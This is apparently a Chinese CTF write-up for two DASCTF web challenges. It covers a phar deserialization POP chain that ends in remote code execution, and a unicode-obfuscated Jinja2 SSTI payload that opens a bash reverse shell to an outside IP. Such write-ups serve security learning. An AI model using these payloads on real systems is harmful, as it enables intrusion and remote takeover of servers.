<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>DASCTF 七月赋能赛 - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="DASCTF 七月赋能赛 - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://example.com/2023/03/02/DASCTF2022.07%E8%B5%8B%E8%83%BD%E8%B5%9B/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-03-02T10:57:36.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/WriteUp/">WriteUp</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>March</span>
            <span>2,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">DASCTF 七月赋能赛</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>经过前两次比赛的磨练，打算自己模拟打一次看看</p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Ez-to-getflag"><a href="#Ez-to-getflag" class="headerlink" title="Ez to getflag"></a>Ez to getflag</h2><p>考点：略微审计，phar反序列化，任意文件读取<br>难度：这道题可能在大佬面前只是个简单题，我也能做出来应该就是简单题了，但是感觉考的东西还是综合的，在我面前算中档题吧，希望能不断地进步变成简单题<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670077310808-a7d1a2ee-ae76-451b-b33c-c2f5b408808b.png#averageHue=%23174b5c&clientId=u20a3b87e-f320-4&from=paste&height=830&id=u211796ec&name=image.png&originHeight=1038&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3427801&status=done&style=none&taskId=u3c32ab08-1a72-4789-a7a5-bcd9dd7dde1&title=&width=1536" alt="image.png"><br>文件读取和文件上传界面，凭着经验发现可以任意文件读取，把下面所有重要文件读出来了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="variable">$show</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="variable">$upload</span> = <span class="keyword">new</span> <span class="title class_">Upload</span>();</span><br><span class="line"><span class="variable">$upload</span>-&gt;<span class="title function_ invoke__">uploadfile</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">Upload</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$fname</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$fsize</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="variable language_">$this</span>-&gt;f = <span class="variable">$_FILES</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">savefile</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">  <span class="variable">$fname</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;f[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.png&quot;</span>; </span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;./upload/&#x27;</span>.<span class="variable">$fname</span>)) &#123; </span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;./upload/&#x27;</span>.<span class="variable">$fname</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$this</span>-&gt;f[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . <span class="variable">$fname</span>); </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;upload success! :D&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$cont</span> = <span class="variable language_">$this</span>-&gt;fname;</span><br><span class="line">  <span class="variable">$size</span> = <span class="variable language_">$this</span>-&gt;fsize;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$cont</span>-&gt;<span class="variable">$size</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;this_is_upload&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uploadfile</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file_check</span>()) &#123; </span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">savefile</span>(); </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">file_check</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  <span class="variable">$allowed_types</span> = <span class="keyword">array</span>(<span class="string">&quot;png&quot;</span>);</span><br><span class="line">  <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$this</span>-&gt;f[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">  <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>); </span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$extension</span>)) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;what are you uploaded? :0&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>,<span class="variable">$allowed_types</span>)) &#123;</span><br><span class="line">      <span class="variable">$filter</span> = <span class="string">&#x27;/&lt;\?php|php|exec|passthru|popen|proc_open|shell_exec|system|phpinfo|assert|chroot|getcwd|scandir|delete|rmdir|rename|chgrp|chmod|chown|copy|mkdir|file|file_get_contents|fputs|fwrite|dir/i&#x27;</span>;</span><br><span class="line">      <span class="variable">$f</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;f[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$filter</span>,<span class="variable">$f</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;what are you doing!! :C&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;png onlyyy! XP&#x27;</span>; </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$fname</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;source = <span class="variable">$fname</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|file:|php:|gopher|dict|\.\./i&#x27;</span>,<span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&#x27;illegal fname :P&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;source);</span><br><span class="line">      <span class="variable">$src</span> = <span class="string">&quot;data:jpg;base64,&quot;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;source));</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=<span class="subst">&#123;$src&#125;</span> /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">ok</span>(<span class="variable">$name</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">end</span>(<span class="variable">$arguments</span>)==<span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">      <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">backdoor</span>(<span class="title function_ invoke__">end</span>(<span class="variable">$arguments</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">backdoor</span>(<span class="params"><span class="variable">$door</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$door</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacked!!&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;illegal fname XD&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;str=<span class="string">&quot;It&#x27;s works&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;str;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>审计过后不难发现漏洞点在<code>backdoor</code>函数，里面有危险函数<code>include</code>，也很容易的发现pop链为：<code>Test:__destruct=&gt;Upload:__tostring=&gt;Show:__get=&gt;show:__call=&gt;backdoor()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Upload</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$fname</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$fsize</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="variable language_">$this</span>-&gt;fname=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">  <span class="variable language_">$this</span>-&gt;fsize=<span class="string">&#x27;upload/00bf23e130fa1e525e332ff03dae345d.png&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Test</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;str=<span class="keyword">new</span> <span class="title class_">Upload</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>upload/00bf23e130fa1e525e332ff03dae345d.png</code>是事先上传的shell.png文件<br>将pop中的fsize改为phpinfo就可以看phpinfo界面：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670077635423-c245d053-325e-480a-883d-01628c2428bf.png#averageHue=%23d19a5a&clientId=u20a3b87e-f320-4&from=paste&height=84&id=u4b2b8dc5&name=image.png&originHeight=105&originWidth=1212&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9260&status=done&style=none&taskId=u1c9f5bb4-ae18-4907-aa5a-cd07eb06862&title=&width=969.6" alt="image.png"><br>发现短标签开着,OK可以绕过：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670077651892-42748116-a736-4211-acdc-d77af53abb89.png#averageHue=%23faf9f9&clientId=u20a3b87e-f320-4&from=paste&height=245&id=u823f88d2&name=image.png&originHeight=306&originWidth=1219&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36998&status=done&style=none&taskId=udced6b34-244a-4a0d-ac6f-deb602b4179&title=&width=975.2" alt="image.png"><br>之后就在file.php读取我们的phar文件，这里phar文件也需要绕过，可以看到<code>&lt;?php __HALT_COMPILER(); ?&gt;</code>有敏感字样php，这边需要在linux对phar文件gzip压缩后：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670077699194-583f36c5-c122-4e67-9d8d-eb6069bc3129.png#averageHue=%23121111&clientId=u20a3b87e-f320-4&from=paste&height=162&id=u846bdd25&name=image.png&originHeight=202&originWidth=968&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9989&status=done&style=none&taskId=u9ef93d17-0526-4333-8557-b73d862f8bd&title=&width=774.4" alt="image.png"><br>可以看到是乱码一样的，但是可以触发反序列化，读取之后就可以rce了:<img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670077724363-b37b3ad9-d8e7-486a-894b-e5e4ec2d7a44.png#averageHue=%23f1f1f0&clientId=u20a3b87e-f320-4&from=paste&height=225&id=u8ed32dc3&name=image.png&originHeight=281&originWidth=1177&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21179&status=done&style=none&taskId=u486029ab-403c-4467-af5c-9755c1df109&title=&width=941.6" alt="image.png"><br>参考：</p>
<h2 id="Harddisk"><a href="#Harddisk" class="headerlink" title="Harddisk"></a>Harddisk</h2><p>考点：SSTI逃逸<br>解题数：26<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670085467437-17c4fb0b-ade0-429a-b6b3-61f6e2b3efbc.png#averageHue=%234052b5&clientId=uafeeaac1-8b97-4&from=paste&height=182&id=uc95aad67&name=image.png&originHeight=227&originWidth=250&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6765&status=done&style=none&taskId=uc1f0456d-9ac9-4ff3-a78d-33bf9f740ab&title=&width=200" alt="image.png"><br>先放结果吧，自己写出来了所以还是有成就感的，感觉自己也算真正的入了门了<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670085317125-d53b7346-e789-460c-895b-6abb11aea644.png#averageHue=%230c0a09&clientId=uafeeaac1-8b97-4&from=paste&height=70&id=u47fea6b3&name=image.png&originHeight=87&originWidth=516&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5021&status=done&style=none&taskId=u6f939df8-b147-4c95-80e4-907dc83b9de&title=&width=412.8" alt="image.png"><br>解题时有个小TIps，有关SSTI的题，为了图方便，我都会在CTFSHOW也开一个靶场，就是没过滤的，可以自己尝试payload<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670086256112-b2cd656b-8572-4756-96c9-abbf00fff7d2.png#averageHue=%23dbdbdb&clientId=ubfd672d3-1743-4&from=paste&height=359&id=u46a53f56&name=image.png&originHeight=449&originWidth=1740&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21841&status=done&style=none&taskId=uec5786af-5ec7-4c48-9d7c-4ce20a977c7&title=&width=1392" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fuzz一下可以发现ban掉了`&#123;&#123; . [ print 空格`等关键字</span><br><span class="line">对于双括号的过滤可以考虑用`&#123;%set%&#125;`来绕过，由于ban掉了print，也就注定了这一题没有回显，所以最终肯定是要利用反弹shell的</span><br><span class="line">对于关键字的绕过，经测试可以使用unicode编码达到绕过的目的</span><br><span class="line">执行命令使用标签`&#123;%if%&#125;&#123;%endif%&#125;`，这是无回显的，肯定得用反弹shell</span><br><span class="line">我们原来的paylaod可以为`&#123;%set c=lipsum|attr(&quot;__globals__&quot;|attr(&quot;__getitem__&quot;)(&quot;__builtins__&quot;)|attr(&quot;eval&quot;)(&quot;__import__(&#x27;os&#x27;)&quot;)|attr(&quot;popen&quot;)(&quot;cmd&quot;)|attr(read)()`</span><br><span class="line">空格可以用%09去替代，关键字unicode编码最后payload为：</span><br><span class="line">`&#123;%set%09c=lipsum|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(&quot;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(&quot;eval&quot;)(&quot;\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0027\u006f\u0073\u0027\u0029&quot;)|attr(&quot;\u0070\u006f\u0070\u0065\u006e&quot;)(&quot;\u0062\u0061\u0073\u0068\u0020\u002d\u0063\u0020\u0027\u0062\u0061\u0073\u0068\u0020\u002d\u0069\u0020\u003e\u0026\u0020\u002f\u0064\u0065\u0076\u002f\u0074\u0063\u0070\u002f\u0034\u0033\u002e\u0031\u0034\u0030\u002e\u0032\u0035\u0031\u002e\u0031\u0036\u0039\u002f\u0037\u0037\u0037\u0037\u0020\u0030\u003e\u0026\u0031\u0027&quot;)|attr(&quot;\u0072\u0065\u0061\u0064&quot;)()%&#125;&#123;%if%09c%&#125;1&#123;%endif%&#125;`</span><br></pre></td></tr></table></figure>

<p>可以收到反弹shell：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1670086893279-ea8f34a3-b4bb-4f63-b441-a692e00ccdde.png#averageHue=%23131212&clientId=ubfd672d3-1743-4&from=paste&height=187&id=ude79ce41&name=image.png&originHeight=234&originWidth=874&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11513&status=done&style=none&taskId=u9515a120-5bb3-4a7a-a417-536fc7770c7&title=&width=699.2" alt="image.png"><br>参考：</p>
<p><a target="_blank" rel="noopener" href="https://boogipop.github.io/2022/10/04/CTFSHOW-SSTI/">https://boogipop.github.io/2022/10/04/CTFSHOW-SSTI/</a></p>
